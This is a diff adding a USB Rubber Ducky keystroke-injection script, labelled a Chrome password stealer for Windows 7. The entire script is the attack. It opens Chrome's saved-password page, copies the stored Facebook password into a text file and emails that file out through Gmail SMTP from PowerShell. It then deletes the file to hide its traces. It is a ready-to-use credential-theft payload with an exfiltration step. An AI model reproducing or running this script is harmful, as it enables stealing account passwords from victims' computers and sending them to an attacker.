@@ -1,0 +1,77 @@
+REM Author: Nuk3leus
+REM Ducky chrome password stealer: 1.0
+REM Target: Windows 7
+REM Description: Opens chrome, navigates to chrome settings, navigates to saved passwords, searches for facebook, shows password, copys password
+REM closes chrome, Opens notepad and pastes in password, saves to music folder, closes notepad.
+DELAY 2000
+REM -------------open chrome
+GUI
+DELAY 500
+STRING chrome
+DELAY 2000
+ENTER
+REM -------------copy plaintext password
+STRING chrome://settings/passwords
+DELAY 2000
+STRING facebook
+DELAY 500
+TAB
+DOWN
+TAB
+TAB
+ENTER
+ALT D
+TAB
+REPEAT 3
+CTRL C
+ALT F4
+REM -------------save file to music folder as passwords.txt
+GUI R
+STRING notepad.exe
+CTRL V
+ALT f
+STRING s
+DELAY 500
+STRING passwords.txt
+TAB
+REPEAT 9
+STRING m
+ENTER
+ALT S
+DELAY 1000
+ALT F4
+REM -------------email log via gmail
+STRING powershell
+ENTER
+DELAY 300
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('gmailuser', 'gmail password');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'sending email account'
+ENTER
+STRING $ReportEmail.To.Add('email account to send report')
+ENTER
+STRING $ReportEmail.Subject = 'Duck Report'
+ENTER
+STRING $ReportEmail.Body = 'Attached is your duck report.' 
+ENTER
+STRING $ReportEmail.Attachments.Add('c:\Users\%USERNAME%\music\passwords.txt')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 2000
+STRING exit
+ENTER
+REM ---------------------delete and end
+STRING del c:\Users\%USERNAME%\music\passwords.txt
+ENTER
+DELAY 300
+STRING exit
+ENTER
